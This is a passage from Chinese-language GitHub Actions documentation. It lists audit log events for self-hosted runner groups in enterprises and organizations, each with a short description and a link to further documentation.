| `enterprise.runner_group_runners_added`  | 当自托管运行器添加到组时触发。 更多信息请参阅“[将自托管运行器移动到组](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)”。                        |
| `enterprise.runner_group_updated`        | 当自托管运行器组的配置改变时触发。 更多信息请参阅“[更改自托管运行器组的访问策略](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)”。 |
| `org.runner_group_created`               | 在创建自托管运行器组时触发。 更多信息请参阅“[为组织创建自托管运行器组](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-organization)”。       |
| `org.runner_group_removed`               | 当自托管运行器组被移除时触发。 更多信息请参阅“[移除自托管运行器组](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)”。                             |
| `org.runner_group_updated`               | 当自托管运行器组的配置改变时触发。 更多信息请参阅“[更改自托管运行器组的访问策略](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)”。 |
| `org.runner_group_runners_added`         | 当自托管运行器添加到组时触发。 更多信息请参阅“[将自托管运行器移动到组](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)”。                        |
| `org.runner_group_runner_removed`        | 当 REST API 用于从组中删除自托管运行器时触发。 更多信息请参阅“[为组织从组中删除自托管运行器](/rest/reference/actions#remove-a-self-hosted-runner-from-a-group-for-an-organization)”。                                                |

### 工作流程活动事件

{% data reusables.actions.actions-audit-events-workflow %}
